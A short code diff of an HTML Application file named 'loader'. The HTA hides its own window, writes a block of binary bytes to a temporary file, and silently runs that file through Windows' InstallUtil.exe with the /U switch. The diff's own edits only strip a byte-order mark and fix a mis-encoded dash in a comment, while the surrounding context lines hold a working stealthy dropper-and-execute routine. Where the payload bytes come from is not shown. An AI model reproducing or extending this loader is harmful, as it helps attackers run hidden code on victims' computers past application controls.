@@ -1,4 +1,4 @@
-﻿<html>
+<html>
 <head>
 <title> </title>
 <HTA:APPLICATION ID="loader" APPLICATIONNAME="loader" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize" />
@@ -45,7 +45,7 @@
   WriteBinary tmpPath, bytes
   If Err.Number <> 0 Then Call Fail("Write failed: " & Err.Description)
 
-  ' Execute via InstallUtil (FIXED: quote paths â€” handles usernames with spaces)
+  ' Execute via InstallUtil (FIXED: quote paths — handles usernames with spaces)
   Dim installUtil
   installUtil = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
   CreateObject("WScript.Shell").Run """" & installUtil & """ /U """ & tmpPath & """", 0, False
